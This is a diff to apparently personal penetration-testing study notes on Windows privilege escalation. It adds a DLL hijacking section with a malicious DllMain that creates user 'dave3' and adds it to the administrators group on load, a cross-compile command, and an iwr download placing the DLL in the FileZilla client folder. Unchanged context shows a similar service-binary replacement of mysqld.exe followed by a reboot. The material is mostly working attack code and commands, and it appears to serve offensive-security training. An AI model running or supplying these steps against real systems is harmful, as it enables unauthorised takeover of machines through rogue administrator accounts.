@@ -1044,7 +1044,7 @@ runas /user:backupadmin cmd
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 ~~~
 
-### icacls permissions mask
+#### icacls permissions mask
 | Mask | Permissions           |
 |------|------------------------|
 | F    | Full access            |
@@ -1053,14 +1053,14 @@ Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Ob
 | R    | Read-only access       |
 | W    | Write-only access      |
 
-### Check service binary permissions
+#### Check service binary permissions
 
 ~~~ powershell
 icacls "C:\xampp\apache\bin\httpd.exe"
 ~~~
 
 
-### adduser.c
+#### adduser.c code
 
 ~~~ c
 #include <stdlib.h>
@@ -1076,47 +1076,90 @@ int main ()
 }
 ~~~
 
-### Cross-Compile the C Code to a 64-bit application
+#### Cross-Compile the C Code to a 64-bit application
 
 ~~~ bash
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 ~~~
 
 
-### Replacing mysqld.exe with our malicious binary
+#### Replacing mysqld.exe with our malicious binary
 
 ~~~ powershell
 move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
 ~~~
 
-### Attempting to stop the service to restart it
+#### Attempting to stop the service to restart it
 
 ~~~ powershell
 net stop mysql
 ~~~
 
-### Obtain Startup Type for mysql service
+#### Obtain Startup Type for mysql service
 
 ~~~ powershell
 Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
 ~~~
 
-### Checking for reboot privileges
+#### Checking for reboot privileges
 
 ~~~ powershell
 whoami /priv
 ~~~
 
-### Rebooting the machine
+#### Rebooting the machine
 
 ~~~ powershell
 shutdown /r /t 0
 ~~~
 
 
-
-
 ### DLL Hijacking
+
+
+#### C++ DLL example code from Microsoft
+
+~~~ c++
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave3 password123! /add");
+  	    i = system ("net localgroup administrators dave3 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+~~~
+
+
+#### Cross-Compile the C++ Code to a 64-bit DLL
+
+~~~ bash
+x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
+~~~
+
+
+#### Download compiled DLL
+
+~~~ powershell
+iwr -uri http://192.168.48.3/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
+~~~
+
 
 ### Unquoted Service Paths
 
